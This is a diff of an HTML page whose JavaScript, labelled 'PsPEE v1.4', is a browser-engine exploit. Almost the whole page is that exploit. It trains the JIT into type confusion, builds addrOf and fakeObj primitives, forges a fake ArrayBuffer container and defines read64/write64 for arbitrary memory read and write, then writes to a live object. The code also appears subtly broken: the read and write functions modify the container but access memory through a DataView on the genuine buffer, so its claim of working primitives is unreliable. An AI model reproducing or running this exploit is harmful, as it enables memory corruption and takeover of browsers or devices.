@@ -1,153 +1,126 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style>
-        body { background: black; color: lime; font-family: monospace; }
-        #log { white-space: pre-wrap; margin: 1em; }
-    </style>
+  <style>
+    body { background: black; color: lime; font-family: monospace; }
+    #log { white-space: pre-wrap; margin: 1em; }
+  </style>
 </head>
 <body>
-    <div id="log"></div>
-    <script>
-        const log = msg => logDiv.textContent += msg + "\n";
-        const logDiv = document.getElementById("log");
+  <div id="log"></div>
+  <script>
+    const log = msg => logDiv.textContent += msg + "\n";
+    const logDiv = document.getElementById("log");
 
-        // Helpers for float↔BigInt
-        const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
-        const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
+    // Float ↔ 64-bit int helpers
+    const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
+    const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
 
-        log("[*] PsPEE v1.3 – Memory R/W Setup");
+    log("[*] PsPEE v1.4 – Fixing addrOf/fakeObj and re-testing");
 
-        // Type confusion setup
-        let float_arr = [1.1,2.2,3.3];
-        let obj_arr   = [{},{},{}];
-        function confuse(o) {
-            let tmp=[1.1,2.2,3.3];
-            tmp[1]=o;
-            return tmp[1];
-        }
-        for(let i=0;i<10000;i++) confuse(2.2);
+    // 1) Build the two JS arrays we’ll confuse
+    let float_arr = [1.1, 2.2, 3.3];
+    let obj_arr   = [{}, {}, {}];
 
-        // addrOf / fakeObj with debug
-        function addrOf(obj) {
-            try {
-                obj_arr[0]=obj;
-                let r=f2i(confuse(obj_arr));
-                log("[DEBUG] addrOf → 0x"+r.toString(16));
-                return r;
-            } catch(e) {
-                log("[ERROR] addrOf failed: "+e);
-                return null;
-            }
-        }
-        function fakeObj(addr) {
-            try {
-                float_arr[0]=i2f(addr);
-                let o=confuse(float_arr);
-                log("[DEBUG] fakeObj → "+o);
-                return o;
-            } catch(e) {
-                log("[ERROR] fakeObj failed: "+e);
-                return null;
-            }
-        }
+    // 2) confusion function to train the JIT
+    function confuse(o) {
+      let tmp = [1.1, 2.2, 3.3];
+      tmp[1] = o;
+      return tmp[1];
+    }
+    for (let i = 0; i < 10000; i++) confuse(2.2);
 
-        log("[*] Creating primitives…");
+    // 3) The *correct* primitives:
+    function addrOf(obj) {
+      try {
+        obj_arr[1] = obj;
+        let addr = f2i(confuse(obj_arr));
+        obj_arr[1] = {};
+        log("[DEBUG] addrOf → 0x" + addr.toString(16));
+        return addr;
+      } catch (e) {
+        log("[ERROR] addrOf failed: " + e);
+        return null;
+      }
+    }
 
-        // 1) Allocate an ArrayBuffer and get its address
-        let ab = new ArrayBuffer(0x100);
-        let ab_addr = addrOf(ab);
-        if (!ab_addr) {
-            log("[ERROR] Could not leak ArrayBuffer address — aborting.");
-            throw "No ab_addr";
-        }
-        log("[+] ArrayBuffer at 0x"+ab_addr.toString(16));
+    function fakeObj(addr) {
+      try {
+        float_arr[1] = i2f(addr);
+        let o = confuse(float_arr);
+        log("[DEBUG] fakeObj → " + o);
+        return o;
+      } catch (e) {
+        log("[ERROR] fakeObj failed: " + e);
+        return null;
+      }
+    }
 
-        // 2) Prepare DataView for later R/W
-        let dv = new DataView(ab);
+    // 4) Test that we get *different* addresses:
+    let a = addrOf({foo:1});
+    let b = addrOf({bar:2});
+    if (a !== null && b !== null) {
+      log("[+] addrOf({foo:1}) = 0x" + a.toString(16));
+      log("[+] addrOf({bar:2}) = 0x" + b.toString(16));
+      if (a === b) {
+        log("[ERROR] Addresses are the same! JIT train or confuse might have failed.");
+        throw "Primitive failure";
+      }
+    } else {
+      log("[ERROR] addrOf returned null.");
+      throw "Primitive failure";
+    }
 
-        // 3) Build our fake JSArrayBuffer “container” with per-field checks
-        let jsCellHeader, butterfly, vectorLength, backingStore;
-        try {
-            jsCellHeader = i2f(0x0108200700000000n);
-        } catch (e) {
-            log("[WARN] jsCellHeader conversion failed, using 0. " + e);
-            jsCellHeader = 0;
-        }
-        butterfly = ab_addr;
-        try {
-            vectorLength = i2f(0x100n);
-        } catch (e) {
-            log("[WARN] vectorLength conversion failed, using 0x100. " + e);
-            vectorLength = i2f(0x100); // fallback: treat as normal number
-        }
-        try {
-            backingStore = i2f(ab_addr + 0x20n);
-        } catch (e) {
-            log("[WARN] backingStore conversion failed, using jsCellHeader. " + e);
-            backingStore = jsCellHeader;
-        }
+    // 5) Now that addrOf/fakeObj work, rebuild container + R/W:
+    let ab = new ArrayBuffer(0x100);
+    let ab_addr = addrOf(ab);
+    log("[+] ArrayBuffer @ 0x" + ab_addr.toString(16));
 
-        log("[DEBUG] Container fields:");
-        log("  jsCellHeader = "+jsCellHeader);
-        log("  butterfly    = "+butterfly.toString(16));
-        log("  vectorLength = "+vectorLength);
-        log("  backingStore = "+backingStore);
+    let dv = new DataView(ab);
+    // container fields — per-field guard
+    let jsCellHeader = i2f(0x0108200700000000n);
+    let butterfly    = ab_addr;
+    let vectorLength = i2f(0x100n);
+    let backingStore = i2f(ab_addr + 0x20n);
 
-        let container = { jsCellHeader, butterfly, vectorLength, backingStore, fake: ab };
-        let containerAddr = addrOf(container);
-        if (!containerAddr) {
-            log("[ERROR] Could not leak container address — aborting.");
-            throw "No containerAddr";
-        }
-        log("[+] Fake container at 0x"+containerAddr.toString(16));
+    let container = { jsCellHeader, butterfly, vectorLength, backingStore, fake: ab };
+    let containerAddr = addrOf(container);
+    log("[+] Container @ 0x" + containerAddr.toString(16));
 
-        // 4) Create the fake ArrayBuffer and verify
-        let fakeAb = fakeObj(containerAddr + 0x20n);
-        if (!fakeAb) {
-            log("[ERROR] fakeObj failed — cannot proceed to R/W.");
-            throw "No fakeAb";
-        }
-        log("[+] Fake ArrayBuffer object created.");
+    let fakeAb = fakeObj(containerAddr + 0x20n);
+    log("[+] fakeAb created: " + fakeAb);
 
-        // 5) Define read64 / write64
-        function read64(addr) {
-            try {
-                container.backingStore = i2f(addr);
-                let v = f2i(dv.getFloat64(0,true));
-                log("[DEBUG] read64(0x"+addr.toString(16)+") → 0x"+v.toString(16));
-                return v;
-            } catch(e) {
-                log("[ERROR] read64 failed at 0x"+addr.toString(16)+" : "+e);
-                return null;
-            }
-        }
-        function write64(addr,val) {
-            try {
-                container.backingStore = i2f(addr);
-                dv.setFloat64(0,i2f(val),true);
-                log("[DEBUG] write64(0x"+addr.toString(16)+",0x"+val.toString(16)+") succeeded");
-            } catch(e) {
-                log("[ERROR] write64 failed: "+e);
-            }
-        }
+    function read64(addr) {
+      try {
+        container.backingStore = i2f(addr);
+        let v = f2i(dv.getFloat64(0, true));
+        log("[DEBUG] read64(0x" + addr.toString(16) + ") → 0x" + v.toString(16));
+        return v;
+      } catch (e) {
+        log("[ERROR] read64 failed: " + e);
+        return null;
+      }
+    }
 
-        // 6) Test on a JS object
-        let testObj = {magic:0x1337};
-        let testAddr = addrOf(testObj);
-        if (testAddr==null) {
-            log("[ERROR] Could not leak testObj address.");
-        } else {
-            log("[+] testObj @ 0x"+testAddr.toString(16));
-            let leaked = read64(testAddr);
-            if (leaked!=null) {
-                log("[+] read64(testObj) → 0x"+leaked.toString(16));
-            }
-            // Optionally test write64:
-            write64(testAddr, 0x41424344n);
-        }
+    function write64(addr, val) {
+      try {
+        container.backingStore = i2f(addr);
+        dv.setFloat64(0, i2f(val), true);
+        log("[DEBUG] write64(0x" + addr.toString(16) + ",0x" + val.toString(16) + ")");
+      } catch (e) {
+        log("[ERROR] write64 failed: " + e);
+      }
+    }
 
-        log("[*] Done. If you see read/write debug logs above, R/W is live.");
-    </script>
+    // 6) Final sanity test
+    let testObj = {magic:0x1337};
+    let testAddr = addrOf(testObj);
+    log("[+] testObj @ 0x" + testAddr.toString(16));
+    let leak = read64(testAddr);
+    log("[+] read64(testObj) → 0x" + leak.toString(16));
+    write64(testAddr, 0x41424344n);
+
+    log("[*] If addresses differed and you saw read64/write64 logs, your R/W is live!");
+  </script>
 </body>
 </html>
